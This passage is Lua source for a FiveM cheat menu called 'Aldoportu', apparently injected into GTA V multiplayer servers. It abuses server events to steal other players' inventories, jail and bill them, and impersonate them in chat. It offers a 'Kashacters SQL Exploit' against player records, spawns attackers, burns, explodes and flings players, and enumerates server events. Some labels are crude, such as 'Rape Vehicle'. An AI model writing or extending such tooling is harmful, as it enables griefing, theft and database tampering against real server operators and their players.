				Aldoportu.storedControls.weapSpawnAsPickup = not Aldoportu.storedControls.weapSpawnAsPickup
			elseif Aldoportu.button('Give All Weapons', 'Native') then
				Aldoportu.functions.sPO.giveAllWeapons(Aldoportu.storedControls.weapSpawnAsPickup, GetPlayerPed(selectedPlayer))
			elseif Aldoportu.button('Remove All Weapons', 'Native') then
				Aldoportu.trashFunctions.reqControlOnce(GetPlayerPed(selectedPlayer))
				RemoveAllPedWeapons(GetPlayerPed(selectedPlayer), true)
				RemoveAllPedWeapons(GetPlayerPed(selectedPlayer), false)
			elseif Aldoportu.button('Give Ammo', 'Native') then
				for i = 1, #Aldoportu.trashTables.weaponsModels do
					AddAmmoToPed(GetPlayerPed(selectedPlayer), GetHashKey(Aldoportu.trashTables.weaponsModels[i]), 250)
				end
			end

			for i = 1, #Aldoportu.trashTables.weaponsModels do
				if Aldoportu.button(Aldoportu.trashTables.weaponsModels[i]) then
					if Aldoportu.storedControls.weapSpawnAsPickup then
						CreatePickup(GetHashKey('PICKUP_'..Aldoportu.trashTables.weaponsModels[i]), GetEntityCoords(Aldoportu.datastore.pLocalPlayer.pedId))
					else
						Aldoportu.natives.giveWeaponToPed(GetPlayerPed(selectedPlayer), GetHashKey(Aldoportu.trashTables.weaponsModels[i]), 250, false, true)
					end
				end
			end

			Aldoportu.runDrawMenu()
		elseif Aldoportu.isMenuOpened('selectedPlayerOptionsTriggers') then
			if Aldoportu.button('Open Inventory', 'ESX | Client') then
				Aldoportu.dTCE(false, false, 'esx_inventoryhud:openPlayerInventory', GetPlayerServerId(selectedPlayer), GetPlayerName(selectedPlayer))
			elseif Aldoportu.button('Disc Search Inventory', 'ESX | Client') then
				Aldoportu.functions.sPO.SearchDisc(GetPlayerServerId(selectedPlayer))
			elseif Aldoportu.button('Disc Steal Inventory', 'ESX | Client') then
				Aldoportu.functions.sPO.StealDisc(GetPlayerServerId(selectedPlayer))
			elseif Aldoportu.button('Jail', 'ESX | Server') then
				local time = Aldoportu.trashFunctions.keyboardInput('Enter amount of time', '5391', 12)
				if Aldoportu.functions.game.isNullOrEmpty(time) then time = 5391 end
				Aldoportu.functions.sPO.jailTheFucker(GetPlayerServerId(selectedPlayer), time)
			elseif Aldoportu.button('Un-Jail', 'ESX | Server') then
				Aldoportu.functions.sPO.unJailTheFucker(GetPlayerServerId(selectedPlayer))
			elseif Aldoportu.button('Community Service', 'ESX | Server') then
				Aldoportu.functions.sPO.communityService(GetPlayerServerId(selectedPlayer))
			elseif Aldoportu.button('Send Bill', 'ESX | Server') then
				local billAmount = Aldoportu.trashFunctions.keyboardInput('Enter amount', '', 10)
				local billName = Aldoportu.trashFunctions.keyboardInput('Enter the name of the bill', '', 10)
				if not Aldoportu.functions.game.isNullOrEmpty(billAmount) and not Aldoportu.functions.game.isNullOrEmpty(billName) then
					if Aldoportu.functions.doesResourceExist('esx_billing') then
						Aldoportu.dTCE(false, true, 'esx_billing:sendBill', GetPlayerServerId(selectedPlayer), 'Aldoportu', billName, billAmount)
						Aldoportu.dTCE(false, true, 'esx_billing:sendBill', GetPlayerServerId(selectedPlayer), 'Aldoportu', billName, billAmount)
					else Aldoportu.pushNotification('Resource was not found!', 5000) end
				end
			elseif Aldoportu.button('Spawn Owned Vehicle', 'ESX | Server') then
				local ModelName = Aldoportu.trashFunctions.keyboardInput('Enter Vehicle Spawn Name', '', 20)
				local PlateNumber = Aldoportu.trashFunctions.keyboardInput('Enter Vehicle Plate Number', '', 8)
				Aldoportu.functions.sPO.SpawnLegalVehicle(ModelName, selectedPlayer, PlateNumber)
			elseif Aldoportu.button('Revive Player', 'ESX | Server') then
				Aldoportu.dTCE(false, true, 'esx_ambulancejob:revive', GetPlayerServerId(selectedPlayer))
				Aldoportu.dTCE(false, false, 'esx_ambulancejob:revive', GetPlayerServerId(selectedPlayer))
			elseif Aldoportu.button('Send Fake Message', 'Server') then
				local message = Aldoportu.trashFunctions.keyboardInput('Enter message to send', '', 100)
				if not Aldoportu.functions.game.isNullOrEmpty(message) then
					Aldoportu.dTCE(false, true, '_chat:messageEntered', GetPlayerName(selectedPlayer), {Aldoportu.mainColor.r,Aldoportu.mainColor.g,Aldoportu.mainColor.b}, message)
				end
			elseif Aldoportu.comboBox('Kashacters SQL Exploit', Aldoportu.menuTables.serverKashactersSQL.words, Aldoportu.menuTables.serverKashactersSQL.current, Aldoportu.menuTables.serverKashactersSQL.selected, 
				function(currentIndex, selectedIndex)
					Aldoportu.menuTables.serverKashactersSQL.current = currentIndex
					Aldoportu.menuTables.serverKashactersSQL.selected = currentIndex
					Aldoportu.menuTables.serverKashactersSQL.actual = Aldoportu.menuTables.serverKashactersSQL.lists[Aldoportu.menuTables.serverKashactersSQL.selected]
				end)
				then
					if Aldoportu.datastore.ESX ~= nil then
						Aldoportu.datastore.ESX.TriggerServerCallback('esx_society:getOnlinePlayers', function(players)
							local xPlayer = nil
							for i = 1, #players do
								if players[i].name == GetPlayerName(selectedPlayer) then xPlayer = players[i] end
							end

							if xPlayer then
								dir_print(Aldoportu.menuTables.serverKashactersSQL.actual)
								Aldoportu.functions.exploits.esx_kashacters(xPlayer.identifier, 'clean', Aldoportu.menuTables.serverKashactersSQL.actual)
							else
								dir_print('issue getting xPlayer')
							end
						end)
					else
						dir_print('issue getting ESX')
					end
			end

			Aldoportu.runDrawMenu()
		elseif Aldoportu.isMenuOpened('selectedPlayerOptionsTroll') then
			if Aldoportu.button('Clear Animation/Tasks', 'Native') then
				Aldoportu.natives.clearPedTasksImmediately(GetPlayerPed(selectedPlayer))
			elseif Aldoportu.button('Burn Player ~w~', 'Native') then
				local x, y, z = table.unpack(GetEntityCoords(GetPlayerPed(selectedPlayer)))
				for i=0, 5 do
					StartScriptFire(x, y, z - 0.99, 25, true)
				end
			elseif Aldoportu.button('Rape Vehicle', 'Native') then
				local lastVehicle = GetVehiclePedIsIn(GetPlayerPed(selectedPlayer), false)
				Aldoportu.natives.clearPedTasksImmediately(GetPlayerPed(selectedPlayer))
				Aldoportu.functions.sPO.rapeVehicle(lastVehicle)
			elseif Aldoportu.button('Spawn Weapon Pickups', 'Native') then
				Aldoportu.functions.sPO.giveAllWeapons(true, GetPlayerPed(selectedPlayer))
			elseif Aldoportu.button('Spawn Enemies', 'Native') then
				Aldoportu.functions.sPO.spawnEnemies(GetPlayerPed(selectedPlayer), 'a_m_y_skater_01')
			elseif Aldoportu.button('Spawn Heli Enemies', 'Native') then
				Aldoportu.functions.sPO.spawnHeliEnemies(GetPlayerPed(selectedPlayer))
			elseif Aldoportu.button('Spawn Tank Enemy', 'Native') then
				Aldoportu.functions.sPO.spawnTankEnemy(GetPlayerPed(selectedPlayer))
			elseif Aldoportu.button('Cage', 'Native') then
				Aldoportu.functions.sPO.cagePlayer(GetPlayerPed(selectedPlayer))
			elseif Aldoportu.button('Explode ~r~(!)', 'Native') then
				local coords = GetEntityCoords(GetPlayerPed(selectedPlayer))
				Aldoportu.natives.addExplosion(coords.x+1, coords.y+1, coords.z+1, 4, 100.0, true, false, 0.0)
			elseif Aldoportu.comboBox('Shoot Player', {'Taze', 'Pistol', 'AK'}, Aldoportu.storedControls.sPOShootAtOptionsCurrent, Aldoportu.storedControls.sPOShootAtOptionsSelected, 
				function(currentIndex, selectedIndex)
					Aldoportu.storedControls.sPOShootAtOptionsCurrent = currentIndex
					Aldoportu.storedControls.sPOShootAtOptionsSelected = currentIndex
				end) then
				if Aldoportu.storedControls.sPOShootAtOptionsSelected == 1 then
					Aldoportu.functions.sPO.shootAt(GetPlayerPed(selectedPlayer), 'WEAPON_STUNGUN')
				elseif Aldoportu.storedControls.sPOShootAtOptionsSelected == 2 then
					Aldoportu.functions.sPO.shootAt(GetPlayerPed(selectedPlayer), 'WEAPON_PISTOL')
				elseif Aldoportu.storedControls.sPOShootAtOptionsSelected == 3 then
					Aldoportu.functions.sPO.shootAt(GetPlayerPed(selectedPlayer), 'WEAPON_ASSAULTRIFLE')
				end
			elseif Aldoportu.comboBox('Spawn Props', Aldoportu.comboBoxes[4]._words, Aldoportu.comboBoxes[4]._current, Aldoportu.comboBoxes[4]._selected, 
				function(currentIndex, selectedIndex)
					Aldoportu.comboBoxes[4]._current = currentIndex
					Aldoportu.comboBoxes[4]._selected = currentIndex
				end) then
					if type(Aldoportu.comboBoxes[4]._actual[Aldoportu.comboBoxes[4]._selected]) == 'table' then
						for key, value in pairs(Aldoportu.comboBoxes[4]._actual[Aldoportu.comboBoxes[4]._selected]) do
							Aldoportu.functions.sPO.spawnTrollProp(GetPlayerPed(selectedPlayer), Aldoportu.comboBoxes[4]._actual[Aldoportu.comboBoxes[4]._selected][key])
						end
					else
						Aldoportu.functions.sPO.spawnTrollProp(GetPlayerPed(selectedPlayer), Aldoportu.comboBoxes[4]._actual[Aldoportu.comboBoxes[4]._selected])
					end
			elseif Aldoportu.comboBox('Ram Vehicle', sPORamVehicleWords, sPORamVehicleCurrent, sPORamVehicleSelected, 
				function(currentIndex, selectedIndex)
					sPORamVehicleCurrent = currentIndex
					sPORamVehicleSelected = currentIndex
					sPORamVehicleX = sPORamVehicleWords[currentIndex]
				end) then
				Aldoportu.functions.sPO.ramVehicle(GetPlayerPed(selectedPlayer), sPORamVehicleX)
			elseif Aldoportu.button('Fling Player ~r~(!)', Aldoportu.storedControls.sPOFlingPlayer and 'Flinging: ['..GetPlayerServerId(Aldoportu.storedControls.sPOFlingedPlayer)..']' or 'Flinging: [-1]') then
				Aldoportu.storedControls.sPOFlingPlayer = not Aldoportu.storedControls.sPOFlingPlayer
				Aldoportu.storedControls.sPOFlingedPlayer = selectedPlayer
			end
			
			Aldoportu.runDrawMenu()
		elseif Aldoportu.isMenuOpened('visualOptions') then
			if Aldoportu.menuButton('Extra Sensory Perception', 'visualOptionsESP', '', {dict = 'mphud', text = 'spectating', color = {r=255, g=255, b=255}}) then
			elseif Aldoportu.comboBox('Crosshair', customCrosshairOpts, currentCustomCrosshair, selectedCustomCrosshair, 
				function(currentIndex, selectedIndex)
					currentCustomCrosshair = currentIndex
					selectedCustomCrosshair = currentIndex
				end)
				then
			elseif Aldoportu.checkBox('Draw FPS', Aldoportu.storedControls.visDrawFPS) then
				Aldoportu.storedControls.visDrawFPS = not Aldoportu.storedControls.visDrawFPS
			elseif Aldoportu.checkBox('Show Coords', Aldoportu.storedControls.teleShowCoords) then
				Aldoportu.storedControls.teleShowCoords = not Aldoportu.storedControls.teleShowCoords
			elseif Aldoportu.checkBox('Force Player Blips', Aldoportu.storedControls.visPlayerBlips) then
				Aldoportu.storedControls.visPlayerBlips = not Aldoportu.storedControls.visPlayerBlips
			elseif Aldoportu.checkBox('Force Radar', Aldoportu.storedControls.visForceRadar) then
				Aldoportu.storedControls.visForceRadar = not Aldoportu.storedControls.visForceRadar
			elseif Aldoportu.checkBox('Force Gamertags', Aldoportu.storedControls.visForceGamertags) then
				Aldoportu.storedControls.visForceGamertags = not Aldoportu.storedControls.visForceGamertags
			elseif Aldoportu.checkBox('Force Third-person', Aldoportu.storedControls.visForceThirdperson) then
				Aldoportu.storedControls.visForceThirdperson = not Aldoportu.storedControls.visForceThirdperson
			elseif Aldoportu.checkBox('Blackout', Aldoportu.storedControls.visBlackout) then
				Aldoportu.storedControls.visBlackout = not Aldoportu.storedControls.visBlackout
			elseif Aldoportu.button('Optimize FPS', 'Native') then
				Aldoportu.functions.optimizeFPS()
			end

			Aldoportu.runDrawMenu()
		elseif Aldoportu.isMenuOpened('visualOptionsESP') then
			if Aldoportu.checkBox('Enable', Aldoportu.storedControls.visESPEnable) then
				Aldoportu.storedControls.visESPEnable = not Aldoportu.storedControls.visESPEnable
				Aldoportu.functions.toggleESP()
			elseif Aldoportu.checkBox('ID', Aldoportu.storedControls.visESPShowID) then
				Aldoportu.storedControls.visESPShowID = not Aldoportu.storedControls.visESPShowID
			elseif Aldoportu.checkBox('Name', Aldoportu.storedControls.visESPShowName) then
				Aldoportu.storedControls.visESPShowName = not Aldoportu.storedControls.visESPShowName
			elseif Aldoportu.checkBox('Distance', Aldoportu.storedControls.visESPShowDistance) then
				Aldoportu.storedControls.visESPShowDistance = not Aldoportu.storedControls.visESPShowDistance
			elseif Aldoportu.checkBox('Weapon', Aldoportu.storedControls.visESPShowWeapon) then
				Aldoportu.storedControls.visESPShowWeapon = not Aldoportu.storedControls.visESPShowWeapon
			elseif Aldoportu.checkBox('Vehicle', Aldoportu.storedControls.visESPShowVehicle) then
				Aldoportu.storedControls.visESPShowVehicle = not Aldoportu.storedControls.visESPShowVehicle
			elseif Aldoportu.comboBoxSlider('ESP Refresh Rate', Aldoportu.storedControls.visualsESPRefreshRates, Aldoportu.storedControls.currentESPRefreshIndex, Aldoportu.storedControls.selectedESPRefreshIndex, 
				function(currentIndex, selectedIndex)
					Aldoportu.storedControls.currentESPRefreshIndex = currentIndex
					Aldoportu.storedControls.selectedESPRefreshIndex = currentIndex
					if currentIndex == 1 then
						Aldoportu.storedControls.visualsESPRefreshRate = 0
					elseif currentIndex == 2 then
						Aldoportu.storedControls.visualsESPRefreshRate = 50
					elseif currentIndex == 3 then
						Aldoportu.storedControls.visualsESPRefreshRate = 150
					elseif currentIndex == 4 then
						Aldoportu.storedControls.visualsESPRefreshRate = 250
					elseif currentIndex == 5 then
						Aldoportu.storedControls.visualsESPRefreshRate = 500
					elseif currentIndex == 6 then
						Aldoportu.storedControls.visualsESPRefreshRate = 1000
					elseif currentIndex == 7 then
						Aldoportu.storedControls.visualsESPRefreshRate = 2000
					elseif currentIndex == 8 then
						Aldoportu.storedControls.visualsESPRefreshRate = 5000
					end
				end) then
			elseif Aldoportu.comboBoxSlider('ESP Distance', Aldoportu.storedControls.visualsESPDistanceOps, Aldoportu.storedControls.currentVisualsESPDistance, Aldoportu.storedControls.selectedVisualsESPDistance, 
				function(currentIndex, selectedIndex)
					Aldoportu.storedControls.currentVisualsESPDistance = currentIndex
					Aldoportu.storedControls.selectedVisualsESPDistance = currentIndex
					Aldoportu.storedControls.visualsESPDistance = Aldoportu.storedControls.visualsESPDistanceOps[Aldoportu.storedControls.currentVisualsESPDistance]
				end) then
			end

			Aldoportu.runDrawMenu()
		elseif Aldoportu.isMenuOpened('teleportOptions') then
			if Aldoportu.comboBox('Teleport To', {'Legion Square', 'Weed Farm', 'Meth Farm', 'Coke Farm', 'Money Wash', 'Mission Row PD'}, Aldoportu.storedControls.currentTeleportToOptions, Aldoportu.storedControls.selectedTeleportToOptions, 
				function(currentIndex, selectedIndex)
					Aldoportu.storedControls.currentTeleportToOptions = currentIndex
					Aldoportu.storedControls.selectedTeleportToOptions = currentIndex
				end)
				then
				if Aldoportu.storedControls.selectedTeleportToOptions == 1 then
					Aldoportu.functions.teleportSelf(195.23, -934.04, 30.69)
				elseif Aldoportu.storedControls.selectedTeleportToOptions == 2 then
					Aldoportu.functions.teleportSelf(1066.009, -3183.386, -39.164)
				elseif Aldoportu.storedControls.selectedTeleportToOptions == 3 then
					Aldoportu.functions.teleportSelf(998.629, -3199.545, -36.394)
				elseif Aldoportu.storedControls.selectedTeleportToOptions == 4 then
					Aldoportu.functions.teleportSelf(1088.636, -3188.551, -38.993)
				elseif Aldoportu.storedControls.selectedTeleportToOptions == 5 then
					Aldoportu.functions.teleportSelf(1118.405, -3193.687, -40.394)
				elseif Aldoportu.storedControls.selectedTeleportToOptions == 6 then
					Aldoportu.functions.teleportSelf(441.56, -982.9, 30.69)
				end
			elseif Aldoportu.button('Teleport To Waypoint', 'Native') then
				Aldoportu.functions.teleportToWaypoint()
			end

			Aldoportu.runDrawMenu()
		elseif Aldoportu.isMenuOpened('vehicleOptions') then
			if Aldoportu.menuButton('Los Santos Customs', 'vehicleLosSantosCustoms') then
			elseif Aldoportu.menuButton('Saved Vehicles', 'savedVehiclesOptions') then
			elseif Aldoportu.menuButton('Vehicle Spawn List', 'vehicleSpawnList') then
			elseif Aldoportu.checkBox('Godmode', Aldoportu.storedControls.vehGodmode) then
				Aldoportu.storedControls.vehGodmode = not Aldoportu.storedControls.vehGodmode
				Aldoportu.functions.repairVehicle(Aldoportu.datastore.pLocalPlayer.cVehicle)
			elseif Aldoportu.button('Repair Vehicle', 'Native') then
				Aldoportu.functions.repairVehicle(Aldoportu.datastore.pLocalPlayer.cVehicle)
			elseif Aldoportu.button('Clean Vehicle', 'Native') then
				SetVehicleDirtLevel(Aldoportu.datastore.pLocalPlayer.cVehicle, 0.0)
			elseif Aldoportu.button('Dirty Vehicle', 'Native') then
				SetVehicleDirtLevel(Aldoportu.datastore.pLocalPlayer.cVehicle, 15.0)
			elseif Aldoportu.button('Flip Vehicle', 'Native') then
				SetVehicleOnGroundProperly(Aldoportu.datastore.pLocalPlayer.cVehicle)
			elseif Aldoportu.button('Delete Vehicle', 'Native') then
				Aldoportu.functions.deleteVehicle(Aldoportu.datastore.pLocalPlayer.cVehicle)
			elseif Aldoportu.button('Delete Vehicles Within Radius', 'Native') then
				Aldoportu.functions.deleteVehicle(Aldoportu.datastore.pLocalPlayer.cVehicle, 100)
			elseif Aldoportu.comboBoxSlider('Engine Power Boost', Aldoportu.comboBoxes[3]._words, vehiclesEnginePowerBoostCurrent, vehiclesEnginePowerBoostSelected, 
				function(currentIndex, selectedIndex)
					vehiclesEnginePowerBoostCurrent = currentIndex
					vehiclesEnginePowerBoostSelected = currentIndex
				end) then
			elseif Aldoportu.comboBoxSlider('Engine Torque Boost', Aldoportu.comboBoxes[3]._words, vehiclesEngineTorqueBoostCurrent, vehiclesEngineTorqueBoostSelected, 
				function(currentIndex, selectedIndex)
					vehiclesEngineTorqueBoostCurrent = currentIndex
					vehiclesEngineTorqueBoostSelected = currentIndex
				end) then
			elseif Aldoportu.comboBox('Change Sound', Aldoportu.comboBoxes[2]._words, Aldoportu.comboBoxes[2]._current, Aldoportu.comboBoxes[2]._selected, 
				function(currentIndex, selectedIndex)
					Aldoportu.comboBoxes[2]._current = currentIndex
					Aldoportu.comboBoxes[2]._selected = selectedIndex
				end) then
					ForceVehicleEngineAudio(GetVehiclePedIsIn(GetPlayerPed(-1), false), Aldoportu.comboBoxes[2]._words[Aldoportu.comboBoxes[2]._selected])
			elseif Aldoportu.comboBox('Suspension', Aldoportu.comboBoxes[1]._words, Aldoportu.comboBoxes[1]._current, Aldoportu.comboBoxes[1]._selected, 
				function(currentIndex, selectedIndex)
					Aldoportu.comboBoxes[1]._current = currentIndex
					Aldoportu.comboBoxes[1]._selected = selectedIndex
				end) then
					local pVehicle = Aldoportu.datastore.pLocalPlayer.cVehicle
					if pVehicle and DoesEntityExist(pVehicle) then
						local currentSuspension = GetVehicleHandlingFloat(pVehicle, 'CHandlingData', 'fSuspensionRaise')
						if Aldoportu.comboBoxes[1]._words[Aldoportu.comboBoxes[1]._selected] == 'Lower' then
							SetVehicleHandlingFloat(pVehicle, 'CHandlingData', 'fSuspensionRaise', currentSuspension - 0.01)
						elseif Aldoportu.comboBoxes[1]._words[Aldoportu.comboBoxes[1]._selected] == 'Raise' then
							SetVehicleHandlingFloat(pVehicle, 'CHandlingData', 'fSuspensionRaise', currentSuspension + 0.01)
						end
						Aldoportu.functions.repairVehicle(pVehicle)
					end
			elseif Aldoportu.checkBox('No Fall', Aldoportu.storedControls.vehNoFall) then
				Aldoportu.storedControls.vehNoFall = not Aldoportu.storedControls.vehNoFall
			elseif Aldoportu.checkBox('Rainbow Paintjob', Aldoportu.storedControls.vehRainbowCol) then
				local storedPrimary, storedSecondary = nil
				if Aldoportu.storedControls.vehRainbowCol then
					ClearVehicleCustomPrimaryColour(Aldoportu.datastore.pLocalPlayer.cVehicle)
					ClearVehicleCustomSecondaryColour(Aldoportu.datastore.pLocalPlayer.cVehicle)
					SetVehicleColours(Aldoportu.datastore.pLocalPlayer.cVehicle, storedPrimary, storedSecondary)
				else
					storedPrimary, storedSecondary = GetVehicleColours(Aldoportu.datastore.pLocalPlayer.cVehicle)
				end
				Aldoportu.storedControls.vehRainbowCol = not Aldoportu.storedControls.vehRainbowCol
			elseif Aldoportu.checkBox('Rainbow Lights', Aldoportu.storedControls.vehRainbowLights) then
				Aldoportu.storedControls.vehRainbowLights = not Aldoportu.storedControls.vehRainbowLights
			elseif Aldoportu.checkBox('Wallride', Aldoportu.storedControls.vehWallride) then
				Aldoportu.storedControls.vehWallride = not Aldoportu.storedControls.vehWallride
			elseif Aldoportu.checkBox('2-Step Vehicle', Aldoportu.storedControls.veh2Step) then
				Aldoportu.storedControls.veh2Step = not Aldoportu.storedControls.veh2Step
			elseif Aldoportu.checkBox('Always Wheelie', Aldoportu.storedControls.vehAlwaysWheelie) then
				Aldoportu.storedControls.vehAlwaysWheelie = not Aldoportu.storedControls.vehAlwaysWheelie
			elseif Aldoportu.checkBox('Drift Smoke', Aldoportu.storedControls.vehDriftSmoke) then
				Aldoportu.storedControls.vehDriftSmoke = not Aldoportu.storedControls.vehDriftSmoke
			end

			Aldoportu.runDrawMenu()
		elseif Aldoportu.isMenuOpened('weaponOptions') then
			if Aldoportu.menuButton('Give Single Weapon', 'weaponOptionsTypes') then
			elseif Aldoportu.menuButton('Modify Weapon', 'weaponOptionsModification') then
			elseif Aldoportu.button('Give All Weapons', 'Native') then
				Aldoportu.functions.sPO.giveAllWeapons(false, GetPlayerPed(-1))
            elseif Aldoportu.button('Remove All Weapons', 'Native') then
				RemoveAllPedWeapons(Aldoportu.datastore.pLocalPlayer.pedId, true)
			elseif Aldoportu.comboBox('Re-fill Ammo', {'Current', 'All'}, Aldoportu.storedControls.weaponsGiveAmmoCurrent, Aldoportu.storedControls.weaponsGiveAmmoSelected, 
				function(currentIndex, selectedIndex)
                    Aldoportu.storedControls.weaponsGiveAmmoCurrent = currentIndex
					Aldoportu.storedControls.weaponsGiveAmmoSelected = currentIndex
				end) then
					if Aldoportu.storedControls.weaponsGiveAmmoSelected == 1 then
						local retval, weaponHash = GetCurrentPedWeapon(GetPlayerPed(-1), true)
						AddAmmoToPed(GetPlayerPed(-1), weaponHash, 250)
					elseif Aldoportu.storedControls.weaponsGiveAmmoSelected == 2 then
						for i = 1, #Aldoportu.trashTables.weaponsModels do
							AddAmmoToPed(GetPlayerPed(-1), GetHashKey(Aldoportu.trashTables.weaponsModels[i]), 250)
						end
					end
			elseif Aldoportu.comboBox('Damage Multiplier', Aldoportu.storedControls.weaponsDamageMultiplier, Aldoportu.storedControls.weaponsDamageMultiplierCurrent, Aldoportu.storedControls.weaponsDamageMultiplierSelected, 
				function(currentIndex, selectedIndex)
                    Aldoportu.storedControls.weaponsDamageMultiplierCurrent = currentIndex
					Aldoportu.storedControls.weaponsDamageMultiplierSelected = currentIndex
					Aldoportu.storedControls.weaponsDamageMultiplierSet = intToFloat(Aldoportu.storedControls.weaponsDamageMultiplier[Aldoportu.storedControls.weaponsDamageMultiplierSelected])
                end) then
			end
			
			Aldoportu.runDrawMenu()
		elseif Aldoportu.isMenuOpened('weaponOptionsModification') then
			if Aldoportu.checkBox('Custom Bullet', Aldoportu.storedControls.weapCustomBullet) then
				Aldoportu.storedControls.weapCustomBullet = not Aldoportu.storedControls.weapCustomBullet
			elseif Aldoportu.comboBox('Custom Bullets', Aldoportu.menuTables.weaponsCustomBullet.words, Aldoportu.menuTables.weaponsCustomBullet.current, Aldoportu.menuTables.weaponsCustomBullet.selected, 
				function(currentIndex, selectedIndex)
					Aldoportu.menuTables.weaponsCustomBullet.current = currentIndex
					Aldoportu.menuTables.weaponsCustomBullet.selected = currentIndex
					Aldoportu.menuTables.weaponsCustomBullet.actual = Aldoportu.menuTables.weaponsCustomBullet.lists[Aldoportu.menuTables.weaponsCustomBullet.selected]
				end)
				then
			elseif Aldoportu.checkBox('Explosive Impact', Aldoportu.storedControls.weapExplosiveAmmo) then
				Aldoportu.storedControls.weapExplosiveAmmo = not Aldoportu.storedControls.weapExplosiveAmmo
			elseif Aldoportu.checkBox('Teleport To Impact', Aldoportu.storedControls.weapTeleportGun) then
				Aldoportu.storedControls.weapTeleportGun = not Aldoportu.storedControls.weapTeleportGun
			elseif Aldoportu.checkBox('Rapid Fire', Aldoportu.storedControls.weapRapidFire) then
				Aldoportu.storedControls.weapRapidFire = not Aldoportu.storedControls.weapRapidFire
			end

			Aldoportu.runDrawMenu()
		elseif Aldoportu.isMenuOpened('serverOptions') then
			Aldoportu.setSubTitle('serverOptions', 'Server IP: '..Aldoportu.natives.getCurrentServerEndpoint())
			if Aldoportu.menuButton('Server Resources', 'serverOptionsResources') then
			elseif Aldoportu.menuButton('Trigger Events', 'serverOptionsTriggerEvents') then
			elseif Aldoportu.comboBoxSlider('Ped Density', pedDensityXWords, pedDensityXCurrent, pedDensityXSelectedf, 
				function(currentIndex, selectedIndex)
					pedDensityXCurrent = currentIndex
					pedDensityXSelectedf = currentIndex
					pedDensityXSelected = pedDensityX[currentIndex]
				end) then
			end
			
			if Aldoportu.button('Resource', Aldoportu.natives.getCurrentResourceName()) then
			end

			if Aldoportu.functions.doesResourceExist('es_extended') then
				if Aldoportu.datastore.es_extended then
					if Aldoportu.button('ESX', (tostring(Aldoportu.datastore.es_extended) == 'esx:getSharedObject' and '' or '~r~')..tostring(Aldoportu.datastore.es_extended)) then
					end
				end
			end

			Aldoportu.runDrawMenu()
		elseif Aldoportu.isMenuOpened('serverOptionsResources') then
			if validResources and validResources ~= nil and #validResources > 0 then
				for _, resource in pairs(validResources) do
					if Aldoportu.menuButton(resource, 'serverOptionsResourcesSelected') then
						SelectedResource = resource
					end
				end
			else
				local resourcesTableYK = Aldoportu.trashFunctions.getResources()
				for i=1, #resourcesTableYK do
					if Aldoportu.button(resourcesTableYK[i]) then 
					end
				end
			end

			Aldoportu.runDrawMenu()
		elseif Aldoportu.isMenuOpened('serverOptionsResourcesSelected') then
			Aldoportu.setSubTitle('serverOptionsResourcesSelected', SelectedResource .. ' Data')
			if Aldoportu.menuButton('Client Events', 'serverOptionsResourcesSelectedCEvents') then 
			end
			if Aldoportu.menuButton('Server Events', 'serverOptionsResourcesSelectedSEvents') then 
			end

			Aldoportu.runDrawMenu()
		elseif Aldoportu.isMenuOpened('serverOptionsResourcesSelectedCEvents') then
			Aldoportu.setSubTitle('serverOptionsResourcesSelectedCEvents', SelectedResource .. ' Client Events')
			for key, name in pairs(validResourceEvents[SelectedResource]) do
				if Aldoportu.button(name) then
					print(key)
				end
			end

			Aldoportu.runDrawMenu()
		elseif Aldoportu.isMenuOpened('serverOptionsResourcesSelectedSEvents') then
			Aldoportu.setSubTitle('serverOptionsResourcesSelectedSEvents', SelectedResource .. ' Server Events')
			if validResourceServerEvents[SelectedResource] ~= nil then
				for name, payload in pairs(validResourceServerEvents[SelectedResource]) do
					if Aldoportu.button(name) then
						local tbl = msgpack.unpack(payload)
						local buffer = name .. '('
						for k, v in ipairs(tbl) do
							buffer = (buffer .. tostring(v) .. (k == #tbl and ')' or ', '))
						end

						if #tbl == 0 then
							buffer = (buffer .. ')')
						end
						
						print('^2' .. buffer)
					end
				end
			end

			Aldoportu.runDrawMenu()
		elseif Aldoportu.isMenuOpened('menuSettings') then
			if Aldoportu.menuButton('Credits', 'credits') then
			elseif Aldoportu.menuButton('Keybinds', 'keybindSettings') then
			elseif Aldoportu.comboBox('Menu X', menuX, currentMenuX, selectedMenuX, 
				function(currentIndex, selectedIndex)
					currentMenuX = currentIndex
					selectedMenuX = selectedIndex
					for i = 1, #Aldoportu.menus_list do
						Aldoportu.setMenuX(Aldoportu.menus_list[i], menuX[currentMenuX])
					end
                end) 
                then
            elseif Aldoportu.comboBox('Menu Y', menuY, currentMenuY, selectedMenuY, 
				function(currentIndex, selectedIndex)
					currentMenuY = currentIndex
					selectedMenuY = selectedIndex
					for i = 1, #Aldoportu.menus_list do
						Aldoportu.setMenuY(Aldoportu.menus_list[i], menuY[currentMenuY])
					end
                end)
				then
			elseif Aldoportu.comboBox('Maximum Displayed Options', menuOptionsCount, currentMenuOptionsCount, selectedMenuOptionsCount, 
				function(currentIndex, selectedIndex)
					currentMenuOptionsCount = currentIndex
					selectedMenuOptionsCount = selectedIndex
					for i = 1, #Aldoportu.menus_list do
						Aldoportu.setMaxOptionCount(Aldoportu.menus_list[i], menuOptionsCount[currentMenuOptionsCount])
					end
                end) 
                then
			elseif Aldoportu.comboBox('Theme', Aldoportu.menuProps.availableThemes, currentThemeIndex, selectedThemeIndex, 
				function(currentIndex, selectedIndex)
					currentThemeIndex = currentIndex
					selectedThemeIndex = currentIndex
				end) then 
					Aldoportu.menuProps.selectedTheme = Aldoportu.menuProps.availableThemes[selectedThemeIndex]
					Aldoportu.initTheme()
			elseif Aldoportu.comboBox('Checkbox Style', Aldoportu.menuProps.availableCheckboxStyles, currentCheckboxIndex, selectedCheckboxIndex, 
				function(currentIndex, selectedIndex)
					currentCheckboxIndex = currentIndex
					selectedCheckboxIndex = currentIndex
				end) then
					Aldoportu.menuProps.selectedCheckboxStyle = Aldoportu.menuProps.availableCheckboxStyles[selectedCheckboxIndex]
			elseif Aldoportu.checkBox('Rainbow', Aldoportu.menuProps.selectedThemeRainbow) then
				Aldoportu.menuProps.selectedThemeRainbow = not Aldoportu.menuProps.selectedThemeRainbow
			elseif Aldoportu.checkBox('Text Outline', Aldoportu.menuProps.menu_TextOutline) then
				Aldoportu.menuProps.menu_TextOutline = not Aldoportu.menuProps.menu_TextOutline
			elseif Aldoportu.checkBox('Text Drop Shadow', Aldoportu.menuProps.menu_TextDropShadow) then
				Aldoportu.menuProps.menu_TextDropShadow = not Aldoportu.menuProps.menu_TextDropShadow
			elseif Aldoportu.checkBox('Selection Rect', Aldoportu.menuProps.menu_RectOverlay) then
				Aldoportu.menuProps.menu_RectOverlay = not Aldoportu.menuProps.menu_RectOverlay
